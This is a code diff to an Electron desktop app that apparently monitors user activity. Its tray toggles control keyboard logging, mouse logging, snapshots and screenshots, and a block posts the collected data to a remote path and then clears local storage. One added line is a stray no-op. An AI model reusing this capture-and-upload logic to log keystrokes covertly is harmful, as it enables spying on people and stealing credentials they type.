@@ -5,6 +5,8 @@ const path = require('path');
 let shared=require("./src/app/shared/Shared.js");
 let response=shared.readSetting();
 var fs = require('fs'); 
+let SetEnvirment=require("./src/environments/environment.js");
+SetEnvirment.SetProject_dir();
 console.log(__dirname);
 const url = require('url')
 function createWindow () {
@@ -28,16 +30,28 @@ app.whenReady().then(
     let trayIcon = new Tray(path.join(__dirname,"./src/assets/images/logo.png"))
 
     const trayMenuTemplate = [
-    {label:"ScreenShot",submenu:[
-      { label: 'Enable ScreenShot', type: 'radio',checked:response.SnapShotEnable ==true?true:false  ,click: function () {
+    {label:"SnapShot",submenu:[
+      { label: 'Enable SnapShot', type: 'radio',checked:response.SnapShotEnable ==true?true:false  ,click: function () {
         response.SnapShotEnable=true;
 
-      fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response));
+      fs.writeFileSync(SetEnvirment.SettingPath(),JSON.stringify(response));
       }
         },
-     { label: 'Disable ScreenShot', type: 'radio',checked:response.SnapShotEnable ==false?true:false ,click: function () {
+     { label: 'Disable SnapShot', type: 'radio',checked:response.SnapShotEnable ==false?true:false ,click: function () {
       response.SnapShotEnable=false;
-     fs.writeFileSync("Storage/Settings.json",JSON.stringify(response));
+     fs.writeFileSync(SetEnvirment.SettingPath(),JSON.stringify(response));
+     }
+       }
+    ]},{label:"ScreenShot",submenu:[
+      { label: 'Enable ScreenShot', type: 'radio',checked:response.ScreenShotEnable ==true?true:false  ,click: function () {
+        response.ScreenShotEnable=true;
+
+      fs.writeFileSync(SetEnvirment.SettingPath(),JSON.stringify(response));
+      }
+        },
+     { label: 'Disable ScreenShot', type: 'radio',checked:response.ScreenShotEnable ==false?true:false ,click: function () {
+      response.ScreenShotEnable=false;
+     fs.writeFileSync(SetEnvirment.SettingPath(),JSON.stringify(response));
      }
        }
     ]},
@@ -45,12 +59,12 @@ app.whenReady().then(
       { label: 'Enable logging', type: 'radio',checked:response.KeyboardEnable ==true?true:false , click: function () {
        
         response.KeyboardEnable=true;
-       fs.writeFileSync("Storage/Settings.json",JSON.stringify(response));
+       fs.writeFileSync(SetEnvirment.SettingPath(),JSON.stringify(response));
       }
         },
      { label: 'Disable logging', type: 'radio',checked:response.KeyboardEnable ==false?true:false , click: function () {
       response.KeyboardEnable=false;
-    fs.writeFileSync("Storage/Settings.json",JSON.stringify(response));
+    fs.writeFileSync(SetEnvirment.SettingPath(),JSON.stringify(response));
      }
        }
     ]},
@@ -59,12 +73,12 @@ app.whenReady().then(
       { label: 'Enable logging', type: 'radio',checked:response.MouseEnable ==true?true:false , click: function () {
         response.MouseEnable=true;
 
-       fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response) );
+       fs.writeFileSync(SetEnvirment.SettingPath(),JSON.stringify(response) );
       }
         },
      { label: 'Disable logging', type: 'radio',checked:response.MouseEnable ==false?true:false , click: function () {
       response.MouseEnable=false;
-    fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response));
+    fs.writeFileSync(SetEnvirment.SettingPath(),JSON.stringify(response));
      }
      }
     ]},
@@ -118,21 +132,20 @@ require('dns').resolve('www.google.com', function(err) {
      console.log("No connection");
   } else {
 
-          let Keyboard_data=shared.GetKeyboardData();
-          if(Keyboard_data.length!=0)
+          let Data=shared.GetData();
+          if(Data.length!=0)
           {
            var path="Data-/"+shared.getRandomInt("999999999")+"/";
-              var body=Keyboard_data
+              var body=Data
+              SetEnvirment
              shared.fnPostData(path,body);
               console.log("yes it happened")
           }else{
             console.log("No Record Found")
           }
           let res=[];
-          fs.writeFileSync("./Storage/KeyboardStorage.json",JSON.stringify(res));
+          fs.writeFileSync(SetEnvirment.StoragePath(),JSON.stringify(res));
   
- 
-    
 }   
 });
 
